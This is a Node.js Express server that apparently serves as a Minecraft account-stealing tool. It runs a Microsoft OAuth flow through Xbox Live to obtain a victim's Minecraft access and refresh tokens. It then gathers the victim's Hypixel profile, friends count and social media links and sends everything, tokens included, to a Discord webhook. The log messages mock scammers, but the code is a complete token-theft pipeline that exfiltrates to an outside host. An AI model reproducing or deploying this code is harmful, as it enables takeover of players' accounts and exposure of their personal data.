//import mods

const ax = require('axios');
var querystring = require('querystring');
const { Webhook, MessageBuilder } = require('discord-webhook-node');
var express = require('express'),
    expressLogging = require('express-logging'),
    logger = require('logops');

var settings = {
    "client_secret":"",
    "client_id":"",
    "redirect_uri":"http://localhost:3000",
    "webhook":"https://discord.com/webhook/XXXXX"
}
function replaceAll(str, find, replace) {
    return str.replace(new RegExp(find, 'g'), replace);
}
function timeConverter(t){
    return new Date(t).toLocaleDateString("en-US")
}
//https://login.live.com/oauth20_authorize.srf?client_id=25ac71ae-716f-4b18-bea0-cfe7aba6ec47&response_type=code&redirect_uri=http%3A%2F%2Flocalhost%3A3000&scope=XboxLive.signin%20offline_access


function getJavaAccess(code){
    const javaPromise = new Promise((resolve, reject) => {
    ax.post(`https://login.microsoftonline.com/consumers/oauth2/v2.0/token`,querystring.stringify({
        "client_id":`${settings['client_id']}`,
        "scope":"XboxLive.signin offline_access",
        "code":`${code}`,
        "redirect_uri":`${settings['redirect_uri']}`,
        "grant_type":"authorization_code",
        "client_secret":`${settings['client_secret']}`      
    }),{headers:{"Content-Type":"application/x-www-form-urlencoded"}}).then((resp) =>{ 
        const refreshtoken = resp.data['refresh_token']
        var fdf = {
            "Properties": {
                "AuthMethod": "RPS",
                "SiteName": "user.auth.xboxlive.com",
                "RpsTicket": "d=" + resp.data['access_token']
            },
            "RelyingParty": "http://auth.xboxlive.com",
            "TokenType": "JWT"
        }
        ax.post('https://user.auth.xboxlive.com/user/authenticate', fdf).then(resp => {
            var xbxreq =  {
                "Properties": {
                    "SandboxId": "RETAIL",
                    "UserTokens": [
                        "" + resp.data['Token']
                    ]
                },
                "RelyingParty": "rp://api.minecraftservices.com/",
                "TokenType": "JWT"
             }
            ax.post('https://xsts.auth.xboxlive.com/xsts/authorize', xbxreq).then(resp2 =>{
                const uhs = JSON.stringify(resp2.data['DisplayClaims']['xui'][0]['uhs'])
                var lastAuth= {
                    "identityToken": `XBL3.0 x=${replaceAll(uhs,'"',"")};${replaceAll(JSON.stringify(resp2.data['Token']),'"',"")}`
                }
                ax.post('https://api.minecraftservices.com/authentication/login_with_xbox',lastAuth).then(responz => {
                    resolve({"access":responz.data['access_token'],"refresh":refreshtoken})
                    return;

                }).catch(err => reject(err))
        }).catch(err => reject(err))
    }).catch(err => reject(err))
})})
return javaPromise;
}


const app = express()
const port = 3000
var apiKey = "HYPIXEL_API_KEY"
app.use(expressLogging(logger));
app.get('/', (req, res) => {
    var accessT = getJavaAccess(req.query.code).then(data => {
        const token = data['access']
        const refresh = data['refresh']
        ax.get('https://api.minecraftservices.com/minecraft/profile', {headers:{"Authorization":"Bearer " + token}}).then(resp => {

            var ply = resp.data['id']
            ax.get("https://api.hypixel.net/friends?uuid=" + ply, {headers:{"API-Key":apiKey,"Content-Type":"application/json","Accept-Encoding": "*"}}).then(resp => {
                //check how many friends the player has.
                var friends = 0;
                for(const friend in resp.data['records']){
                    friends++;
                }
                ax.get("https://api.hypixel.net/player?uuid=" + ply, {headers:{"API-Key":apiKey,"Content-Type":"application/json","Accept-Encoding": "*"}}).then(resp => {
                    const hook = new Webhook(settings['webhook']);
                    const embed = new MessageBuilder().setTitle("New player has been logged.").setAuthor(resp.data['player']['displayname']).setColor("#000000").setDescription("**Access token:** ```" + token + "```\n**Refresh token:** ```" +refresh+"```");
                    embed.addField("Player name: ", resp.data['player']['displayname'],true)
                    embed.addField("First Login Date: ",timeConverter(resp.data['player']['firstLogin']),true)
                    embed.addField("Last login date: ", timeConverter(resp.data['player']['lastLogin']),true)
                    if(resp.data['player']['socialMedia'] != undefined){
                        for(const lol in resp.data['player']['socialMedia']['links']){
                            embed.addField(lol, resp.data['player']['socialMedia']['links'][lol], true)
                        }
                    }
                    embed.addField("\nAchievement Points: ", resp.data['player']['achievementPoints'], true)
                    embed.addField("Karma: ", resp.data['player']['karma'], true)    
                    embed.addField("Friends: ", friends, true)
                    hook.send(embed).then(res => console.log("stop scamming you skid.")).catch(err => {
                        console.log("Error has occured sending everything to the webhook: " + err + "\nalso stop scamming you fucking skid.")
                    })
                })
            })
        })
        res.end("stop scamming")
    }).catch(err => {
        console.log('err: '+err)
    })
})

app.listen(port, () => {
  console.log(`scumbag listens on port: ${port}`)
})